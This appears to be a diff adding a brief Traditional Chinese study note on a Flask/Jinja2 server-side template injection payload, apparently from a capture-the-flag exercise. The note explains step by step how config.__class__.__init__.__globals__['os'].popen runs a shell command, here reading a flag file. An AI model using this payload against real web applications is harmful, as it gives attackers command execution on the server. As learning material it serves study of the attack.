@@ -1,0 +1,31 @@
+{{ 
+
+config.
+
+__class__.
+
+__init__.
+
+__globals__['os'].
+
+popen('cat flag').
+
+read() 
+
+}}
+
+先拿起config.__class__ =flask.config.Config
+
+再來拿到子函數__init__. 
+
+子函數中有__globals__ 字典
+
+這個globals字典會包含 os, sys等原始內建模組
+
+__globals__['os'] 從globals中取出os = import os
+
+os.popen('cat flag')= 透過os執行cat flag
+
+.read() 讀取 cat flag 的輸出內容
+
+理論上所有使用模板引擎的後端框架
